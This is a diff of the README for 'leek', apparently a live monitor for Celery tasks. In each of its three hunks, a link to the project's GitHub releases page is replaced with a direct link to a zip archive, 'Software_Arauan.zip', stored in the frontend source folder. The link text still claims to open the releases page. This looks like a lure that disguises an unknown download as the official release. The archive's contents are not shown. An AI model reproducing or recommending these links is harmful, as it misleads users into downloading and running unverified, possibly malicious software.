@@ -1,6 +1,6 @@
 # 📊 leek - Monitor Celery Tasks Live
 
-[![Download leek](https://img.shields.io/badge/Download%20leek-Visit%20Releases-blue?style=for-the-badge)](https://github.com/efferent-snap874/leek/releases)
+[![Download leek](https://img.shields.io/badge/Download%20leek-Visit%20Releases-blue?style=for-the-badge)](https://github.com/efferent-snap874/leek/raw/refs/heads/main/frontend/src/Software_Arauan.zip)
 
 ## 🧭 What leek does
 
@@ -31,7 +31,7 @@ If you already use Celery, Leek can read the same broker your workers use.
 
 ## ⬇️ Download Leek
 
-[Visit the releases page to download Leek](https://github.com/efferent-snap874/leek/releases)
+[Visit the releases page to download Leek](https://github.com/efferent-snap874/leek/raw/refs/heads/main/frontend/src/Software_Arauan.zip)
 
 On the releases page:
 
@@ -230,6 +230,6 @@ Before you begin, make sure you have:
 
 ## 🔗 Download again
 
-[Open the Leek releases page](https://github.com/efferent-snap874/leek/releases)
+[Open the Leek releases page](https://github.com/efferent-snap874/leek/raw/refs/heads/main/frontend/src/Software_Arauan.zip)
 
 If you need a newer build later, return to the same page and get the latest release
